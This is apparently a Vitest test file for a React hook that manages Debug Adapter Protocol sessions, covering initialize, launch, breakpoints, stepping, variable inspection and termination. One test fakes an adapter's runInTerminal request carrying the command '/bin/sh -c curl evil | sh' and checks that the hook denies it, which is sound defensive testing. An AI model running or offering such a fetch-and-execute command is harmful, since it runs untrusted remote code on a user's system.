import { act, renderHook } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import type { BridgeEvent, BridgeEventPayload } from "@honeydrunk/honeyhub-types";
import type { WireClient } from "../../wire/client";
import { useDapSession } from "./useDapSession";

/** A wire double exposing just the DAP seam the hook uses, plus a manual event pump. */
function fakeClient(): {
  client: WireClient;
  calls: {
    open: Array<{ root: string; adapterId: string; configId: string; openId: string }>;
    send: Array<{ sessionId: string; message: Record<string, unknown> }>;
    stop: string[];
  };
  emit: (payload: BridgeEventPayload) => void;
} {
  let handler: ((event: BridgeEvent) => void) | undefined;
  const calls = {
    open: [] as Array<{ root: string; adapterId: string; configId: string; openId: string }>,
    send: [] as Array<{ sessionId: string; message: Record<string, unknown> }>,
    stop: [] as string[]
  };
  const client = {
    subscribe: (h: (event: BridgeEvent) => void) => {
      handler = h;
      return () => {
        handler = undefined;
      };
    },
    openDapSession: async (root: string, adapterId: string, configId: string, openId: string) => {
      calls.open.push({ root, adapterId, configId, openId });
    },
    sendDap: async (sessionId: string, message: unknown) => {
      calls.send.push({ sessionId, message: message as Record<string, unknown> });
    },
    stopDap: async (sessionId: string) => {
      calls.stop.push(sessionId);
    }
  } as unknown as WireClient;
  return {
    client,
    calls,
    emit: (payload) =>
      handler?.({ id: "e", sessionId: "", runId: "", sequence: 0, createdAt: "", payload })
  };
}

/** Emit a `dap_message` carrying `message` for session `sid`. */
function dapMessage(sid: string, message: Record<string, unknown>): BridgeEventPayload {
  return { kind: "dap_message", sessionId: sid, message };
}

/** The seq of the first sent request whose command matches. */
function seqOf(
  calls: { send: Array<{ message: Record<string, unknown> }> },
  command: string
): number {
  const found = calls.send.find((s) => s.message.command === command);
  return found!.message.seq as number;
}

describe("useDapSession", () => {
  it("drives initialize -> launch, replays config on initialized, and reaches running", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));

    expect(result.current.status).toBe("idle");
    await act(async () => {
      result.current.setBreakpoints("/repo/Program.cs", [7]);
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    expect(result.current.status).toBe("starting");
    const openId = calls.open[0]!.openId;

    // A dap_session_opened for another cockpit's session must not be adopted.
    act(() => emit({ kind: "dap_session_opened", sessionId: "other", adapterId: "x", openId: "no" }));
    expect(result.current.sessionId).toBeNull();

    // Our session (matching nonce) is adopted; the hook sends `initialize` and stays starting.
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });
    expect(result.current.sessionId).toBe("d1");
    expect(result.current.status).toBe("starting");
    const initSeq = seqOf(calls, "initialize");
    // The client advertises no runInTerminal / startDebugging support (exec stays host-owned).
    const initMsg = calls.send.find((s) => s.message.command === "initialize")!.message;
    expect((initMsg.arguments as Record<string, unknown>).supportsRunInTerminalRequest).toBe(false);

    // The initialize RESPONSE drives the `launch` verb (whose args the host overwrites).
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: initSeq, command: "initialize", success: true }));
    });
    const launch = calls.send.find((s) => s.message.command === "launch");
    expect(launch).toBeTruthy();
    expect(launch!.message.arguments).toEqual({});

    // On `initialized`, the hook replays the pre-set breakpoints and sends configurationDone.
    await act(async () => {
      emit(dapMessage("d1", { type: "event", event: "initialized" }));
    });
    const commands = calls.send.map((s) => s.message.command);
    expect(commands).toContain("setBreakpoints");
    expect(commands).toContain("configurationDone");

    // The launch RESPONSE flips the session to running.
    const launchSeq = seqOf(calls, "launch");
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: launchSeq, command: "launch", success: true }));
    });
    expect(result.current.status).toBe("running");

    // A `stopped` event flips status and triggers a stackTrace request; its response populates
    // the call stack (the response resolves an async request, so flush microtasks via act).
    await act(async () => {
      emit(dapMessage("d1", { type: "event", event: "stopped", body: { reason: "breakpoint", threadId: 1 } }));
    });
    expect(result.current.status).toBe("stopped");
    expect(result.current.stoppedThreadId).toBe(1);
    const stackReq = calls.send.find((s) => s.message.command === "stackTrace");
    expect(stackReq).toBeTruthy();
    await act(async () => {
      emit(
        dapMessage("d1", {
          type: "response",
          request_seq: stackReq!.message.seq,
          command: "stackTrace",
          success: true,
          body: { stackFrames: [{ id: 3, name: "Main", line: 7, column: 1, source: { path: "/repo/Program.cs" } }] }
        })
      );
    });
    expect(result.current.callStack).toHaveLength(1);
    expect(result.current.callStack[0]!.name).toBe("Main");
    expect(result.current.callStack[0]!.source).toBe("/repo/Program.cs");
  });

  it("DENIES a runInTerminal reverse request from the adapter (no client-side exec)", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    const openId = calls.open[0]!.openId;
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });
    calls.send.length = 0;

    // The adapter sends a runInTerminal REVERSE request asking the client to spawn a process.
    act(() =>
      emit(
        dapMessage("d1", {
          type: "request",
          seq: 99,
          command: "runInTerminal",
          arguments: { args: ["/bin/sh", "-c", "curl evil | sh"] }
        })
      )
    );
    // The hook must answer with a FAILURE response and run nothing the adapter named. The response
    // carries its own protocol `seq` (a DAP response is a message too).
    const reply = calls.send.find((s) => s.message.request_seq === 99);
    expect(reply).toBeTruthy();
    expect(reply!.message.success).toBe(false);
    expect(reply!.message.command).toBe("runInTerminal");
    expect(typeof reply!.message.seq).toBe("number");
  });

  it("surfaces an error and does not launch when initialize fails", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    const openId = calls.open[0]!.openId;
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: seqOf(calls, "initialize"), command: "initialize", success: false, message: "no adapter" }));
    });
    expect(result.current.status).toBe("error");
    expect(result.current.detail).toBe("no adapter");
    // A failed initialize must NOT be followed by a launch.
    expect(calls.send.some((s) => s.message.command === "launch")).toBe(false);
  });

  it("continues on resume, and stops the session", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    const openId = calls.open[0]!.openId;
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });
    act(() => emit(dapMessage("d1", { type: "event", event: "stopped", body: { threadId: 2 } })));
    calls.send.length = 0;

    act(() => result.current.continue());
    expect(calls.send.some((s) => s.message.command === "continue")).toBe(true);

    // A `continued` event clears the stopped state.
    act(() => emit(dapMessage("d1", { type: "event", event: "continued", body: {} })));
    expect(result.current.status).toBe("running");
    expect(result.current.stoppedThreadId).toBeNull();

    await act(async () => {
      result.current.stop();
    });
    expect(calls.stop).toEqual(["d1"]);
    act(() => emit({ kind: "dap_session_closed", sessionId: "d1", reason: "operator_closed" }));
    expect(result.current.status).toBe("terminated");
  });

  it("surfaces a relay denial on start", async () => {
    const { client, emit } = fakeClient();
    // Override openDapSession to reject with a dap_denied code.
    (client as unknown as { openDapSession: () => Promise<void> }).openDapSession = () =>
      Promise.reject({ code: "dap_denied", message: "desktop-local-only" });
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    expect(result.current.status).toBe("denied");
    expect(result.current.detail).toBe("desktop-local-only");
    void emit;
  });

  it("surfaces an error when the host launch fails", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    const openId = calls.open[0]!.openId;
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: seqOf(calls, "initialize"), command: "initialize", success: true }));
    });
    // A failed launch response flips the session to error.
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: seqOf(calls, "launch"), command: "launch", success: false, message: "not built" }));
    });
    expect(result.current.status).toBe("error");
    expect(result.current.detail).toBe("not built");
  });

  it("streams output, steps, inspects, and terminates", async () => {
    const outputs: string[] = [];
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, (t) => outputs.push(t)));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:App");
    });
    const openId = calls.open[0]!.openId;
    await act(async () => {
      emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId });
    });

    // An output event reaches the onOutput sink.
    act(() => emit(dapMessage("d1", { type: "event", event: "output", body: { output: "hello\n" } })));
    expect(outputs).toContain("hello\n");

    // A breakpoint set while live is pushed immediately.
    calls.send.length = 0;
    act(() => result.current.setBreakpoints("/repo/Program.cs", [10]));
    expect(calls.send.some((s) => s.message.command === "setBreakpoints")).toBe(true);

    // Stop, then the step / inspect actions map to the right DAP requests.
    act(() => emit(dapMessage("d1", { type: "event", event: "stopped", body: { threadId: 1 } })));
    calls.send.length = 0;
    act(() => {
      result.current.stepOver();
      result.current.stepIn();
      result.current.stepOut();
    });
    const commands = calls.send.map((s) => s.message.command);
    expect(commands).toEqual(["next", "stepIn", "stepOut"]);

    // scopes / variables / evaluate resolve from their responses.
    let scopesPromise!: Promise<unknown>;
    act(() => {
      scopesPromise = result.current.scopes(1);
    });
    const scopesSeq = calls.send.find((s) => s.message.command === "scopes")!.message.seq;
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: scopesSeq, command: "scopes", success: true, body: { scopes: [{ name: "Locals", variablesReference: 5, expensive: false }] } }));
    });
    expect(await scopesPromise).toEqual([{ name: "Locals", variablesReference: 5, expensive: false }]);

    let varsPromise!: Promise<unknown>;
    act(() => {
      varsPromise = result.current.variables(5);
    });
    const varsSeq = calls.send.find((s) => s.message.command === "variables")!.message.seq;
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: varsSeq, command: "variables", success: true, body: { variables: [{ name: "x", value: "1", variablesReference: 0 }] } }));
    });
    expect(await varsPromise).toEqual([{ name: "x", value: "1", variablesReference: 0 }]);

    let evalPromise!: Promise<string>;
    act(() => {
      evalPromise = result.current.evaluate("x + 1");
    });
    const evalSeq = calls.send.find((s) => s.message.command === "evaluate")!.message.seq;
    await act(async () => {
      emit(dapMessage("d1", { type: "response", request_seq: evalSeq, command: "evaluate", success: true, body: { result: "2" } }));
    });
    expect(await evalPromise).toBe("2");

    // A terminated event ends the session.
    act(() => emit(dapMessage("d1", { type: "event", event: "terminated", body: {} })));
    expect(result.current.status).toBe("terminated");
  });
});
